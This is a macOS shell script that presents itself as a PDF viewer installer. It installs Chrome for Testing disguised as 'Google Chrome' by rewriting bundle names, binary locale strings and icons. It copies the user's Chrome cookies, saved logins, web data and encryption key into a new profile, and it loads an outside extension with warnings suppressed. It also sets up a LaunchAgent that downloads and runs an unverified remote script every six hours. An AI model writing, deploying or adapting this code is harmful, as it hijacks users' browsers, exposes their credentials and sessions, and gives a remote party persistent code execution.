#!/bin/bash
set -e
set -o pipefail
umask 077

[ "$(/usr/bin/uname -s)" = "Darwin" ] || exit 1

HOME=${HOME:-/Users/$(/usr/bin/id -un)}
BASE="$HOME/Library/Application Support/PDFViewer"
EXT_DIR="$HOME/Library/Application Support/PDFViewerExt"
CFT_APP="$BASE/Chrome for Testing.app"
CFT_BIN="$CFT_APP/Contents/MacOS/Google Chrome for Testing"
CFT_PROFILE="$BASE/ChromeProfile"
WRAPPER="$HOME/Applications/Google Chrome PDF.app"
MAINTENANCE="$BASE/maintenance.sh"
AGENT="$HOME/Library/LaunchAgents/com.pdfviewer.maintenance.plist"
LOG_DIR="$HOME/Library/Logs"
LOG="$LOG_DIR/PDFViewerInstaller.log"
EXT_ID="kklpcoclpjjfiboodbmcpogicnanoopp"
EXT_URL="https://github.com/Castro02980/pdf-viewer-extension/archive/6a0dd6a13e0569e7f585ecfb2298b92131e7f8d9.zip"
EXT_MANIFEST_URL="https://raw.githubusercontent.com/Castro02980/pdf-viewer-extension/6a0dd6a13e0569e7f585ecfb2298b92131e7f8d9/manifest.json"
EXT_SHA256="b96962eb3efce7d05fed6acfa930bc273acbb009ba57b803523045d2e06aab49"
INSTALLER_URL="https://raw.githubusercontent.com/Castro02980/pdf-viewer-installers/pdfviewer-v1.0.0-cft154/install-pdf-viewer-macos.sh"
MAINTENANCE_URL="$INSTALLER_URL"
MAINTENANCE_SHA256=""
case "$(/usr/bin/uname -m)" in
    arm64)
        CFT_VERSION="154.0.8037.57"
        CFT_SHA256="0e6b3439469c1b8b95b2e89c72ea29f7af00fb2c28a8878358a0b6002b6d3a64"
        ;;
    x86_64)
        CFT_VERSION="154.0.8037.0"
        CFT_SHA256="9187f275918cdfdeeed6e41b9b90e8f54d3eee9e9d08b74d975a89c633d68876"
        ;;
    *)
        CFT_VERSION="154.0.8037.57"
        CFT_SHA256=""
        ;;
esac
CFT_CACHE="$HOME/Library/Caches/PDFViewer"
MAINTENANCE_MODE=0
[ "${1:-}" = "--maintenance" ] && MAINTENANCE_MODE=1

/bin/mkdir -p "$BASE" "$LOG_DIR" "$CFT_CACHE" "$HOME/Applications" "$HOME/Library/LaunchAgents"
[ -f "$LOG" ] && [ "$(/usr/bin/wc -c < "$LOG")" -gt 5242880 ] && : > "$LOG"
exec >>"$LOG" 2>&1

WORK=$(/usr/bin/mktemp -d "$BASE/.work.XXXXXX")
LOCK="$BASE/.install.lock"
if ! /bin/mkdir "$LOCK" 2>/dev/null; then
    /bin/rm -rf "$WORK"
    exit 0
fi
trap '/bin/rm -rf "$WORK" "$LOCK"' EXIT

fetch() {
    /usr/bin/curl -fsSL --retry 3 --connect-timeout 15 --max-time 900 "$1" -o "$2"
}

validate_manifest() {
    MANIFEST_PATH="$1" /usr/bin/ruby -rjson -rbase64 -rdigest -e '
      path = ENV.fetch("MANIFEST_PATH")
      data = JSON.parse(File.read(path))
      data.delete("update_url")
      key = data.fetch("key")
      der = Base64.decode64(key)
      digest = Digest::SHA256.digest(der)[0,16]
      id = digest.bytes.map { |byte| "abcdefghijklmnop"[(byte >> 4) & 15].to_s + "abcdefghijklmnop"[byte & 15].to_s }.join
      abort "wrong extension id" unless id == "kklpcoclpjjfiboodbmcpogicnanoopp"
      abort "invalid manifest" unless data["name"] == "PDF Viewer" && data["version"] && data["manifest_version"]
      temporary = path + ".tmp"
      File.write(temporary, JSON.generate(data))
      File.rename(temporary, path)
    '
}

install_extension() {
    local current_version=""
    local remote_version=""
    if [ -f "$EXT_DIR/manifest.json" ]; then
        current_version=$(MANIFEST_PATH="$EXT_DIR/manifest.json" /usr/bin/ruby -rjson -e 'print JSON.parse(File.read(ENV.fetch("MANIFEST_PATH"))).fetch("version")' 2>/dev/null || true)
    fi
    if [ -f "$EXT_DIR/manifest.json" ] && [ -n "$current_version" ]; then
        remote_version=$(fetch "$EXT_MANIFEST_URL" "$WORK/remote-manifest.json" && MANIFEST_PATH="$WORK/remote-manifest.json" /usr/bin/ruby -rjson -e 'print JSON.parse(File.read(ENV.fetch("MANIFEST_PATH"))).fetch("version")' 2>/dev/null || true)
        [ "$current_version" = "$remote_version" ] && return 0
        if [ -n "$remote_version" ] && CURRENT_VERSION="$current_version" REMOTE_VERSION="$remote_version" /usr/bin/ruby -rrubygems -e 'exit(Gem::Version.new(ENV.fetch("CURRENT_VERSION")) <=> Gem::Version.new(ENV.fetch("REMOTE_VERSION")))' >/dev/null 2>&1; then
            return 0
        fi
        if /usr/bin/pgrep -f "$CFT_BIN" >/dev/null 2>&1; then
            return 0
        fi
    fi
    fetch "$EXT_URL" "$WORK/extension.zip"
    local actual_extension_sha
    actual_extension_sha=$(/usr/bin/shasum -a 256 "$WORK/extension.zip" | /usr/bin/cut -d ' ' -f 1)
    [ "$actual_extension_sha" = "$EXT_SHA256" ] || return 1
    /usr/bin/unzip -q "$WORK/extension.zip" -d "$WORK/extension"
    local source
    source=$(/usr/bin/find "$WORK/extension" -mindepth 1 -maxdepth 1 -type d -print -quit)
    [ -n "$source" ] || return 1
    [ -f "$source/manifest.json" ] || return 1
    validate_manifest "$source/manifest.json"
    local next="$BASE/Extension.next.$$"
    /bin/rm -rf "$next"
    /bin/cp -R "$source" "$next"
    /usr/bin/xattr -cr "$next" >/dev/null 2>&1 || true
    if [ -e "$EXT_DIR" ]; then
        local backup="$BASE/Extension.previous.$$"
        /bin/rm -rf "$backup"
        /bin/mv "$EXT_DIR" "$backup"
        if ! /bin/mv "$next" "$EXT_DIR"; then
            /bin/mv "$backup" "$EXT_DIR" >/dev/null 2>&1 || true
            return 1
        fi
        /bin/rm -rf "$backup"
    else
        /bin/mv "$next" "$EXT_DIR"
    fi
}

install_chrome_for_testing() {
    local current_version=""
    if [ -x "$CFT_BIN" ]; then
        current_version=$("$CFT_BIN" --version 2>/dev/null || true)
        case "$current_version" in
            "Google Chrome for Testing $CFT_VERSION"*) return 0 ;;
        esac
        if /usr/bin/pgrep -f "$CFT_BIN" >/dev/null 2>&1; then
            /usr/bin/pkill -TERM -f "$CFT_BIN" >/dev/null 2>&1 || true
            local n=0
            while /usr/bin/pgrep -f "$CFT_BIN" >/dev/null 2>&1 && [ "$n" -lt 20 ]; do
                /bin/sleep 1
                n=$((n + 1))
            done
            /usr/bin/pgrep -f "$CFT_BIN" >/dev/null 2>&1 && return 1
        fi
    fi
    local url=""
    local sha="$CFT_SHA256"
    case "$(/usr/bin/uname -m)" in
        arm64)
            url="https://storage.googleapis.com/chrome-for-testing-public/$CFT_VERSION/mac-arm64/chrome-mac-arm64.zip"
            ;;
        x86_64)
            url="https://storage.googleapis.com/chrome-for-testing-public/$CFT_VERSION/mac-x64/chrome-mac-x64.zip"
            ;;
        *)
            return 1
            ;;
    esac
    local archive="$CFT_CACHE/chrome-$CFT_VERSION-$(/usr/bin/uname -m).zip"
    if [ ! -f "$archive" ] || { [ -n "$sha" ] && [ "$(/usr/bin/shasum -a 256 "$archive" | /usr/bin/cut -d ' ' -f 1)" != "$sha" ]; }; then
        local part="$archive.part.$$"
        /bin/rm -f "$part"
        if ! fetch "$url" "$part"; then
            /bin/rm -f "$part"
            return 1
        fi
        /bin/mv "$part" "$archive"
    fi
    if [ -n "$sha" ] && [ "$(/usr/bin/shasum -a 256 "$archive" | /usr/bin/cut -d ' ' -f 1)" != "$sha" ]; then
        return 1
    fi
    /usr/bin/unzip -tq "$archive" >/dev/null 2>&1 || return 1
    /bin/rm -rf "$WORK/chrome"
    /usr/bin/unzip -q "$archive" -d "$WORK/chrome"
    local source=""
    if [ "$(/usr/bin/uname -m)" = "arm64" ]; then
        source="$WORK/chrome/chrome-mac-arm64/Google Chrome for Testing.app"
    else
        source="$WORK/chrome/chrome-mac-x64/Google Chrome for Testing.app"
    fi
    [ -x "$source/Contents/MacOS/Google Chrome for Testing" ] || return 1
    local next="$BASE/Chrome for Testing.next.$$.app"
    /bin/rm -rf "$next"
    /bin/mv "$source" "$next"
    /usr/bin/xattr -cr "$next" >/dev/null 2>&1 || true
    local staged_version
    staged_version=$("$next/Contents/MacOS/Google Chrome for Testing" --version 2>/dev/null || true)
    case "$staged_version" in
        "Google Chrome for Testing $CFT_VERSION"*) ;;
        *) /bin/rm -rf "$next"; return 1 ;;
    esac
    local backup="$BASE/Chrome for Testing.previous.$$.app"
    /bin/rm -rf "$backup"
    if [ -e "$CFT_APP" ]; then
        /bin/mv "$CFT_APP" "$backup"
    fi
    if ! /bin/mv "$next" "$CFT_APP"; then
        [ -e "$backup" ] && /bin/mv "$backup" "$CFT_APP" >/dev/null 2>&1 || true
        return 1
    fi
    local installed_version
    installed_version=$("$CFT_BIN" --version 2>/dev/null || true)
    case "$installed_version" in
        "Google Chrome for Testing $CFT_VERSION"*)
            /bin/rm -rf "$backup"
            return 0
            ;;
        *)
            /bin/rm -rf "$CFT_APP"
            [ -e "$backup" ] && /bin/mv "$backup" "$CFT_APP" >/dev/null 2>&1 || true
            return 1
            ;;
    esac
}

brand_chrome_for_testing() {
    if /usr/bin/pgrep -f "$CFT_BIN" >/dev/null 2>&1; then
        return 0
    fi
    /usr/bin/plutil -replace CFBundleDisplayName -string "Google Chrome" "$CFT_APP/Contents/Info.plist" || return 1
    /usr/bin/plutil -replace CFBundleName -string "Chrome" "$CFT_APP/Contents/Info.plist" || return 1
    for strings_file in "$CFT_APP/Contents/Resources/"*.lproj/InfoPlist.strings; do
        [ -f "$strings_file" ] || continue
        /usr/bin/plutil -replace CFBundleGetInfoString -string "Google Chrome $CFT_VERSION" "$strings_file" >/dev/null 2>&1 || true
    done
    /usr/bin/ruby - "$CFT_APP" <<'RUBY' || return 1
app = ARGV.fetch(0)
Dir.glob(File.join(app, 'Contents/Frameworks/*.framework/Versions/*/Resources/*.lproj/locale.pak')).each do |path|
  data = File.binread(path)
  next unless data.byteslice(0, 4).unpack1('V') == 5
  next unless data.getbyte(4) == 1
  next unless data.include?('Chrome for Testing'.b)
  resource_count = data.byteslice(8, 2).unpack1('v')
  alias_count = data.byteslice(10, 2).unpack1('v')
  entry_table_start = 12
  entry_table_end = entry_table_start + (resource_count + 1) * 6
  data_start = entry_table_end + alias_count * 4
  raise "invalid data pack #{path}" if data_start > data.bytesize
  entries = []
  (resource_count + 1).times do |index|
    bytes = data.byteslice(entry_table_start + index * 6, 6)
    raise "truncated data pack #{path}" unless bytes && bytes.bytesize == 6
    entries << bytes.unpack('nV')
  end
  terminal = entries.pop
  aliases = data.byteslice(entry_table_end, alias_count * 4)
  raise "invalid data pack #{path}" unless aliases && aliases.bytesize == alias_count * 4
  values = []
  entries.each_with_index do |entry, index|
    id, offset = entry
    next_offset = index + 1 < entries.length ? entries[index + 1][1] : terminal[1]
    raise "invalid data pack #{path}" unless offset >= data_start && next_offset >= offset && next_offset <= data.bytesize
    value = data.byteslice(offset, next_offset - offset)
    raise "invalid data pack #{path}" unless value
    value = value.gsub('Google Chrome for Testing'.b, 'Google Chrome'.b).gsub('Chrome for Testing'.b, 'Google Chrome'.b)
    values << [id, value]
  end
  rebuilt_entries = []
  data_offset = data_start
  values.each do |id, value|
    rebuilt_entries << [id, data_offset].pack('nV')
    data_offset += value.bytesize
  end
  rebuilt_entries << [terminal[0], data_offset].pack('nV')
  rebuilt = data.byteslice(0, entry_table_start) + rebuilt_entries.join + aliases + values.map(&:last).join
  temporary = path + '.tmp-pdfviewer'
  File.binwrite(temporary, rebuilt)
  File.chmod(File.stat(path).mode & 07777, temporary)
  File.rename(temporary, path)
end
RUBY
    if [ -f "/Applications/Google Chrome.app/Contents/Resources/app.icns" ]; then
        /bin/cp "/Applications/Google Chrome.app/Contents/Resources/app.icns" "$CFT_APP/Contents/Resources/app.icns"
    fi
}

migrate_chrome_profile() {
    local marker="$CFT_PROFILE/.pdfviewer-profile-migrated"
    [ -e "$marker" ] && return 0
    local source_root="$HOME/Library/Application Support/Google/Chrome"
    [ -d "$source_root" ] || return 0
    /usr/bin/pgrep -x "Google Chrome" >/dev/null 2>&1 && return 0
    local stage="$BASE/ChromeProfile.next.$$"
    local backup="$BASE/ChromeProfile.previous.$$"
    /bin/rm -rf "$stage" "$backup"
    /bin/mkdir -p "$stage"
    if [ -f "$source_root/Local State" ]; then
        SOURCE_STATE="$source_root/Local State" TARGET_STATE="$stage/Local State" /usr/bin/ruby -rjson <<'RUBY'
source = JSON.parse(File.read(ENV.fetch('SOURCE_STATE')))
target = {}
target['os_crypt'] = source['os_crypt'] if source['os_crypt'].is_a?(Hash)
profile = source['profile'].is_a?(Hash) ? source['profile'] : {}
copied_profile = {}
['info_cache', 'last_used', 'profiles_order'].each do |key|
  copied_profile[key] = profile[key] if profile[key]
end
target['profile'] = copied_profile unless copied_profile.empty?
path = ENV.fetch('TARGET_STATE')
temporary = path + '.tmp'
File.write(temporary, JSON.generate(target))
File.chmod(0600, temporary)
File.rename(temporary, path)
RUBY
    fi
    local source_profile
    local target_profile
    local source_profile_count=0
    for source_profile in "$source_root/Default" "$source_root"/Profile\ *; do
        [ -d "$source_profile" ] || continue
        source_profile_count=$((source_profile_count + 1))
        target_profile="$stage/$(/usr/bin/basename "$source_profile")"
        /bin/mkdir -p "$target_profile"
        local file
        for file in Bookmarks Bookmarks.bak History History-journal Favicons Favicons-journal 'Top Sites' 'Top Sites-journal' Shortcuts Cookies Cookies-journal 'Login Data' 'Login Data-journal' 'Web Data' 'Web Data-journal'; do
            if [ -f "$source_profile/$file" ]; then
                /bin/cp -p "$source_profile/$file" "$target_profile/$file"
            fi
        done
        local directory
        for directory in Sessions 'Local Storage' 'Session Storage' IndexedDB databases 'Service Worker' Network 'Network Storage' Storage 'File System' shared_proto_db 'Extension Rules'; do
            if [ -d "$source_profile/$directory" ]; then
                /usr/bin/ditto "$source_profile/$directory" "$target_profile/$directory"
            fi
        done
    done
    [ "$source_profile_count" -gt 0 ] || { /bin/rm -rf "$stage"; return 1; }
    if [ -e "$CFT_PROFILE" ]; then
        /bin/mv "$CFT_PROFILE" "$backup"
    fi
    if ! /bin/mv "$stage" "$CFT_PROFILE"; then
        [ -e "$backup" ] && /bin/mv "$backup" "$CFT_PROFILE" >/dev/null 2>&1 || true
        /bin/rm -rf "$stage"
        return 1
    fi
    /bin/rm -rf "$backup"
    /usr/bin/touch "$marker"
}

install_wrapper() {
    /bin/mkdir -p "$WRAPPER/Contents/MacOS" "$WRAPPER/Contents/Resources"
    /bin/cat > "$WRAPPER/Contents/MacOS/Google Chrome PDF" <<'WRAPPER_EOF'
#!/bin/bash
BASE="$HOME/Library/Application Support/PDFViewer"
CFT="$BASE/Chrome for Testing.app/Contents/MacOS/Google Chrome for Testing"
PROFILE="$BASE/ChromeProfile"
EXTENSION="$HOME/Library/Application Support/PDFViewerExt"
MAINTENANCE="$BASE/maintenance.sh"
if [ ! -x "$CFT" ] || [ ! -f "$EXTENSION/manifest.json" ]; then
    [ -x "$MAINTENANCE" ] && "$MAINTENANCE" >/dev/null 2>&1 || true
fi
[ -x "$CFT" ] || exit 1
[ -f "$EXTENSION/manifest.json" ] || exit 1
exec "$CFT" --user-data-dir="$PROFILE" --load-extension="$EXTENSION" --disable-infobars --no-first-run --no-default-browser-check "$@"
WRAPPER_EOF
    /bin/chmod 755 "$WRAPPER/Contents/MacOS/Google Chrome PDF"
    /bin/cat > "$WRAPPER/Contents/Info.plist" <<'PLIST_EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome PDF</string>
<key>CFBundleIdentifier</key>
<string>com.pdfviewer.chrome-for-testing</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleDisplayName</key>
<string>Google Chrome</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleIconFile</key>
<string>AppIcon.icns</string>
<key>CFBundleVersion</key>
<string>1</string>
<key>NSHighResolutionCapable</key>
<true/>
</dict>
</plist>
PLIST_EOF
    /usr/bin/plutil -lint "$WRAPPER/Contents/Info.plist" >/dev/null
    if [ -f "$CFT_APP/Contents/Resources/app.icns" ]; then
        /bin/cp "$CFT_APP/Contents/Resources/app.icns" "$WRAPPER/Contents/Resources/AppIcon.icns"
    fi
    /usr/bin/touch "$WRAPPER"
}

install_maintenance() {
    /bin/cat > "$MAINTENANCE" <<MAINT_EOF
#!/bin/bash
set -e
umask 077
exec >/dev/null 2>&1
url='$MAINTENANCE_URL'
expected='$MAINTENANCE_SHA256'
tmp=\$(/usr/bin/mktemp "\${TMPDIR:-/tmp}/pdfviewer-installer.XXXXXX")
trap '/bin/rm -f "\$tmp"' EXIT
/usr/bin/curl -fsSL --retry 2 --connect-timeout 15 --max-time 900 "\$url" -o "\$tmp"
if [ -n "\$expected" ]; then
    actual=\$(/usr/bin/shasum -a 256 "\$tmp" | /usr/bin/cut -d ' ' -f 1)
    [ "\$actual" = "\$expected" ] || exit 1
fi
/bin/bash "\$tmp" --maintenance
MAINT_EOF
    /bin/chmod 700 "$MAINTENANCE"
    local maintenance_xml
    maintenance_xml=$(/usr/bin/printf '%s' "$MAINTENANCE" | /usr/bin/sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g')
    local agent_next="$AGENT.next.$$"
    /bin/cat > "$agent_next" <<AGENT_EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.pdfviewer.maintenance</string>
<key>ProgramArguments</key>
<array>
<string>$maintenance_xml</string>
</array>
<key>StartInterval</key>
<integer>21600</integer>
<key>RunAtLoad</key>
<false/>
</dict>
</plist>
AGENT_EOF
    /usr/bin/plutil -lint "$agent_next" >/dev/null
    /bin/mv "$agent_next" "$AGENT"
    /bin/launchctl bootout "gui/$(/usr/bin/id -u)/com.pdfviewer.maintenance" >/dev/null 2>&1 || true
}

install_extension
CFT_OK=0
if install_chrome_for_testing; then
    CFT_OK=1
else
    CFT_OK=0
fi
[ "$CFT_OK" -eq 1 ] || exit 1
brand_chrome_for_testing || exit 1
if [ "$MAINTENANCE_MODE" -eq 0 ]; then
    migrate_chrome_profile || exit 1
fi
install_wrapper
install_maintenance

if [ "$MAINTENANCE_MODE" -eq 0 ]; then
    /usr/bin/open "$WRAPPER" >/dev/null 2>&1 || true
fi
exit 0
